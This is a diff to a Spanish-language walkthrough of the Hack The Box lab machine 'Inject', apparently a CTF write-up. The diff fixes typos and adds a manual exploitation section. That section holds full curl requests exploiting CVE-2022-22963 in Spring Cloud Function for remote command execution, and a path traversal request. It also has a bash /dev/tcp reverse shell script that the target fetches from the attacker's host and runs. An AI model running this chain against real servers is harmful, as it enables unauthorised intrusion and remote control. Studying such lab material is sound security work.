@@ -59,7 +59,7 @@ Corre por el puerto 8080, ahora podemos ver la web correctamente.
 _Web Error_
 
 ## Detectando posibles métodos de intrución
-Vemos un Login, lo cual podemos crear una cuanta y probar cosas pero no existe dicho archiv, y vemos un **Sing Up** existe, podemos probar injeciones SQL y NoSQL pero nos redirige a una página que nos induca que esta en construcción.
+Vemos un Login, lo cual podemos crear una cuanta y probar cosas pero no existe dicho archivo y vemos un **Sing Up** podemos probar injeciones SQL y NoSQL pero nos redirige a una página que nos indica que esta en construcción.
 ## Enumerando Directorios
 
 Usando **WFUZZ** veremos algunos directorios importantes
@@ -95,11 +95,11 @@ La carpera **/upload** nos llama la atención, ingresamos a ella y podemos ver q
 ![Upload]({{ 'assets/img/commons/inject-writeup/up.png' | relative_url }}){: .center-image }
 _Upload_
 
-Si suvimos una reverse shell de PHP nos dice que solo adminte imagenes, subimos una imagen random y meremos resultados.
+Si subimos una reverse shell de PHP nos dice que solo adminte imagenes, subimos una imagen random y miremos resultados.
 ![Imagen]({{ 'assets/img/commons/inject-writeup/up1.png' | relative_url }}){: .center-image }
 _Imagen_
 
-entramos a ver la imagen y .....mmmm  **img?=** eso huele a **Directory Transversal**.Podemos probar ver el **/etc/passwd** ingresamos la cadena 
+entramos a ver la imagen y .....mmmm  **img?=** eso huele a **Directory Transversal**. Podemos probar ver el **/etc/passwd** ingresamos la cadena 
 
 ![Searchsploit]({{ 'assets/img/commons/inject-writeup/dt.png' | relative_url }}){: .center-image }
 _Directory Transversal_
@@ -214,7 +214,153 @@ Viendo algunas versiones nos encontranos con **Spring Cloud Function Web**, busc
 
 ### Explotación manual
 
-Muy pronto, les explicaré cómo resolver de forma manual. Se paciente.
+Si buscamos `CVE` relacionadas vemos este [articulo](https://sysdig.com/blog/cve-2022-22963-spring-cloud/)  y este repo de [github](https://github.com/me2nuk/CVE-2022-22963) le pasamos mediante una petición `curl` y con un argumento de java intentamos ejecutar código remoto.
+
+
+```bash
+❯ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 10.10.11.204:8080...
+* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
+> POST /functionRouter HTTP/1.1
+> Host: 10.10.11.204:8080
+> User-Agent: curl/7.88.1
+> Accept: */*
+> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")
+> Content-Length: 4
+> Content-Type: application/x-www-form-urlencoded
+> 
+< HTTP/1.1 500 
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Date: Tue, 04 Apr 2023 19:13:59 GMT
+< Connection: close
+< 
+* Closing connection 0
+{"timestamp":"2023-04-04T19:13:59.853+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java
+```
+Si comprobamos , notamos que se creo el archvo.
+
+```bash
+❯ curl 'http://10.10.11.204:8080/show_image?img=.././../../../../../././../../../../../tmp'
+.font-unix
+.ICE-unix
+.Test-unix
+.X11-unix
+.XIM-unix
+hsperfdata_frank
+pwned
+sKlBs
+systemd-private-ba772bbc011b4fcb873f3ed2eefd0cc5-ModemManager.service-KPpmah
+systemd-private-ba772bbc011b4fcb873f3ed2eefd0cc5-systemd-logind.service-akTACh
+systemd-private-ba772bbc011b4fcb873f3ed2eefd0cc5-systemd-resolved.service-Dxeleh
+systemd-private-ba772bbc011b4fcb873f3ed2eefd0cc5-systemd-timesyncd.service-6fJWPg
+tomcat.8080.13169043535093016834
+tomcat-docbase.8080.5822812062628089578
+vmware-root_741-4248811580
+YbRuN.b64
+```
+Creamos una reverse shell.
+```bash
+❯ cat pwned.sh
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.83/443 0>&1
+```
+Nos creamos un servidor python
+```bash
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+En otra terminal nos ponemos en escucha.
+```bash
+❯ nc -lvnp 443
+listening on [any] 443 ...
+```
+Subismos el archivo
+```bash
+❯ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget http://10.10.14.83/pwned.sh -o /tmp/pwned.sh")' --data-raw 'data' -v
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 10.10.11.204:8080...
+* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
+> POST /functionRouter HTTP/1.1
+> Host: 10.10.11.204:8080
+> User-Agent: curl/7.88.1
+> Accept: */*
+> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.14.83/pwned.sh -o /tmp/pwned.sh")
+> Content-Length: 4
+> Content-Type: application/x-www-form-urlencoded
+> 
+< HTTP/1.1 500 
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Date: Tue, 04 Apr 2023 19:24:40 GMT
+< Connection: close
+< 
+* Closing connection 0
+{"timestamp":"2023-04-04T19:24:40.750+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}#   
+
+```
+Le damos permiso 
+
+```bash
+❯ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("chmod +x /tmp/pwned.sh")' --data-raw 'data' -v
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 10.10.11.204:8080...
+* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
+> POST /functionRouter HTTP/1.1
+> Host: 10.10.11.204:8080
+> User-Agent: curl/7.88.1
+> Accept: */*
+> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("chmod +x /tmp/pwned.sh")
+> Content-Length: 4
+> Content-Type: application/x-www-form-urlencoded
+> 
+< HTTP/1.1 500 
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Date: Tue, 04 Apr 2023 19:26:55 GMT
+< Connection: close
+< 
+* Closing connection 0
+{"timestamp":"2023-04-04T19:26:55.630+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}#                                                                                                                                                
+```
+Lo ejecutamos
+```bash
+❯ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/pwned.sh")' --data-raw 'data' -v
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 10.10.11.204:8080...
+* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
+> POST /functionRouter HTTP/1.1
+> Host: 10.10.11.204:8080
+> User-Agent: curl/7.88.1
+> Accept: */*
+> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/pwned.sh")
+> Content-Length: 4
+> Content-Type: application/x-www-form-urlencoded
+> 
+< HTTP/1.1 500 
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Date: Tue, 04 Apr 2023 19:33:45 GMT
+< Connection: close
+< 
+* Closing connection 0
+{"timestamp":"2023-04-04T19:33:45.482+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}#                                                                                                                                                
+
+```
+
+Nos llega la shell.
+
+```
+❯ nc -lvnp 443
+❯ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.83] from (UNKNOWN) [10.10.11.204] 34776
+bash: cannot set terminal process group (815): Inappropriate ioctl for device
+bash: no job control in this shell
+frank@inject:/$ 
+```
+
 
 ### Explotación con MetaSploit
 
@@ -316,7 +462,7 @@ phil@inject:~$
 
 ```
 ## Escalada de Privilegios
-No encontramos ningun binario SUID o permiso sudo, pero si si vemos a los grupos que pertenecemos vemos un grupo extraño **staff**.
+No encontramos ningún binario SUID o permiso sudo, pero si si vemos a los grupos que pertenecemos vemos un grupo extraño **staff**.
 ```bash
 phil@inject:~$ id
 uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
